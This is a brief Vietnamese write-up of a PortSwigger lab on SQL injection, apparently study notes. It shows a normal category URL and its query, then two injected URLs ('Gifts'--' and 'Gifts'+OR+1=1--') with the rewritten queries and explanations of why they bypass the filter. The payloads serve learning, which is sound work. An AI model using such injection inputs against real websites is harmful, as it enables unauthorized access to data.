# Lab-portswigger Writeups
# Một câu query bình thường sẽ có kiểu như này : 
https://insecure-website.com/products?category=Gifts

--> SELECT * FROM products WHERE category = 'Gifts' AND released = 1
# một câu query tấn công 
https://insecure-website.com/products?category=Gifts'--

--> SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1

khi có -- thì sql sẽ nghĩ đây là cmt thế nên chúng sẽ không áp dụng câu lệnh AND phía sau nữa 

https://insecure-website.com/products?category=Gifts'+OR+1=1--

--> SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1

Truy vấn đã sửa đổi trả về tất cả các mục trong đó là category, Giftshoặc 1bằng 1. Vì 1=1luôn đúng, nên truy vấn trả về tất cả các mục
